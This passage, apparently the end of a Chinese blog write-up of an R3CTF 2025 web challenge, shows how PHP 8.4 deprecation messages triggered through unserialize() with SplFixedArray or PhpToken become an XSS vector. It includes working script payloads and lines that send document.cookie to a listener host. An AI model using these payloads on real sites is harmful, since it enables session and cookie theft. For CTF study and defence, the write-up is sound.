+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nx">int</span> <span class="nv">$uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s1">&#39;Foo&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">或者</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s1">&#39;test&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接抛出报错name,刚好就是我们想要的报错类型</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Deprecated: Creation of dynamic property User::$name is deprecated in ... on line ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们起一个服务测试一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">foo</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后传入序列化字符串<code>O:3:&quot;foo&quot;:1:{s:3:&quot;bar&quot;;}</code></p>
+<p><img src="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710175653865.png"
+	width="884"
+	height="184"
+	srcset="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710175653865_hu17020961345849391373.png 480w, /p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710175653865_hu3115927636864075705.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250710175653865"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="480"
+		data-flex-basis="1153px"
+	
+></p>
+<p>成功报错，现在只需要寻找一个允许反序列化的类，按照上面的办法本地来试试xss</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">get_declared_classes</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>get_declared_classes</code>获取当前声明的类，版本一定要对8.4</p>
+<p>这里跟着两个佬的wp,他们分别用<code>SplFixedArray</code>和<code>PhpToken</code></p>
+<p>实际上你只需要找一个可能允许反序列化的类就行了</p>
+<p><code>SplFixedArray</code>内置了一个<code>wakeup</code>方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:13:&#34;SplFixedArray&#34;:1:{s:3:&#34;foo&#34;;N;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试一下发现其他报错消失了，而且报错信息可控了</p>
+<p>直接xss</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:13:&#34;SplFixedArray&#34;:1:{s:39:&#34;&lt;script&gt;alert(document.domain)&lt;/script&gt;&#34;;N;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710181759022.png"
+	width="798"
+	height="235"
+	srcset="/p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710181759022_hu1895438964345711654.png 480w, /p/2025r3ctf%E5%A4%8D%E7%8E%B0/image-20250710181759022_hu7412542813652257208.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250710181759022"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="339"
+		data-flex-basis="814px"
+	
+></p>
+<p>如果是用别的也一样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:8:&#34;PhpToken&#34;:1:{s:39:&#34;&lt;script&gt;alert(document.domain)&lt;/script&gt;&#34;;N;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来就是正常流程了，vps起个监听端口，然后弹cookie就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script&gt;fetch(`//ip:port/?${document.cookie}`)&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用PhpToken打的payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://challenge/?data=O:8:&#34;PhpToken&#34;:1:{s:71:&#34;&lt;img src= x onerror=fetch(`//192.168.80.128/?flag=${document.cookie}`)&gt;&#34;;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/2025dasctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025dasctfwp/1.2feb0258814dd14d6c19f8ab8c222dba.png" 
+                        width="1216" 
+                        height="832" 
+                        loading="lazy"
+                        alt="Featured image of post 2025DASCTFwp"
+                        
+                        data-hash="md5-L&#43;sCWIFN0U1sGfirjCItug==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025DASCTFwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025%E9%B8%BF%E8%92%99ctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/1.c8aaeee35cdbe64a0386c10f2226a200.jpg" 
+                        width="1152" 
+                        height="896" 
+                        loading="lazy"
+                        alt="Featured image of post 2025鸿蒙ctfwp"
+                        
+                        data-hash="md5-yKru41zb5koDhsEPIiaiAA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025鸿蒙ctfwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025d3ctf%E5%A4%8D%E7%8E%B0/1.4b0e18f0797c9c902f99f705eb5e74cb.jpg" 
+                        width="1024" 
+                        height="1024" 
+                        loading="lazy"
+                        alt="Featured image of post 2025D^3CTF复现"
+                        
+                        data-hash="md5-Sw4Y8Hl8nJAvmfcF6150yw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025D^3CTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025minilctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.png" loading="lazy" data-key="" data-hash="/1.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025MiniLCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025tgctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025tgctf%E5%A4%8D%E7%8E%B0/1.8a72782d13ca5196f24890ce1e021ab3.png" 
+                        width="1440" 
+                        height="1200" 
+                        loading="lazy"
+                        alt="Featured image of post 2025TGCTF复现"
+                        
+                        data-hash="md5-inJ4LRPKUZbySJDOHgIasw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025TGCTF复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
